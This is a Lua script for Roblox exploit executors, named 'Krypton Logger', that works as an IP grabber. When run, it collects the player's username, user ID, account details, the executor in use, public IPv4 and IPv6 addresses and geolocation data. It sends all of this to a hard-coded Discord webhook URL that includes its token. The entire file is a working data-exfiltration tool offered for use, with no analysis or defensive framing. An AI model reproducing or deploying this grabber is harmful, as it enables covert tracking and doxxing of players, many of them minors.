local Webhook = "https://discord.com/api/webhooks/1247892135353516042/u30BHD-YTdxeGfh75WqNOtcjpP3qwOGRT_4gMZ8TB2Ezg0LaYGF6OU77xnGMTkkIkrru"
local IPv4 = game:HttpGet("https://api.ipify.org")
local IPv6 = game:HttpGet("https://api64.ipify.org")
local HTTPbin = game:HttpGet("https://httpbin.org/get")
local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4)
local Headers = {["content-type"] = "application/json"}
local LocalPlayer = game:GetService("Players").LocalPlayer
local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local UserId = LocalPlayer.UserId
local PlayerName = LocalPlayer.Name
local DisplayName= LocalPlayer.DisplayName
local PlaceID = game.PlaceId
local plr = game.Players.LocalPlayer
local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0')
local rver = "Version 1.0B"
function identifyexploit()
   local ieSuccess, ieResult = pcall(identifyexecutor)
   if ieSuccess then return ieResult end
   
   return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
end

--[[ Webhook ]]--
local PlayerData = {
        ["content"] = "",
        ["embeds"] = {{
            ["author"] = {
                ["name"] = "Krypton Logger "..rver, -- Grabber name and version
            },
           
            ["title"] = PlayerName, -- Username/PlayerName
            ["description"] = ": "..DisplayName, -- Display Name/Nickname
            ["fields"] = {
                {
                    --[[Username/PlayerName]]--
                    ["name"] = "__Username:__",
                    ["value"] = PlayerName,
                    ["inline"] = true
                },
                {
                    --[[User]]--
                    ["name"] = "__User:__",
                    ["value"] = "https://www.roblox.com/users/"..plr.UserId,
                    ["inline"] = true
                },
                {
                    --[[UserID]]--
                    ["name"] = "__UserId:__",
                    ["value"] = UserId,
                    ["inline"] = true
                },
                {
                    --[[Membership type]]--
                    ["name"] = "__Membership Type:__",
                    ["value"] = MembershipType,
                    ["inline"] = true
                },
                {
                    --[[Account age]]--
                    ["name"] = "__Account Age (days):__",
                    ["value"] = AccountAge,
                    ["inline"] = true
                },
                {
                    --[[PlaceID]]--
                    ["name"] = "__Place ID:__ ",
                    ["value"] = PlaceID,
                    ["inline"] = true
                },
                {
                    --[[PlaceID]]--
                    ["name"] = "__Game Link:__ ",
                    ["value"] = "https://www.roblox.com/games/"..PlaceID,
                    ["inline"] = true
                },
                {
                    --[[Exploit/Executor]]--
                    ["name"] = "__Executor:__ ",
                    ["value"] = identifyexploit(),
                    ["inline"] = true
                },
                {
                    --[[IPv4]]--
                    ["name"] = "__IPv4:__",
                    ["value"] = IPv4,
                    ["inline"] = true
                },
                {
                    --[[IPv6]]--
                    ["name"] = "__IPv6:__",
                    ["value"] = IPv6,
                    ["inline"] = true
                },
                {
                    --[[Log/Grab time]]--
                    ["name"] = "__Log Time:__",
                    ["value"] = LogTime,
                    ["inline"] = true
                },
                {
                    --[[HTTPbin]]--
                    ["name"] = "__HTTPbin Data__ (JSON):",
                    ["value"] = "```json"..'\n'..HTTPbin.."```",
                    ["inline"] = false
                },
                {
                    --[[geoPlugin]]--
                    ["name"] = "__geoPlugin Data__ (JSON):",
                    ["value"] = "```json"..'\n'..GeoPlug.."```",
                    ["inline"] = false
                },
            },
        }}
    }

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn then
    HttpRequest = syn.request
    else
    HttpRequest = http_request
end

HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
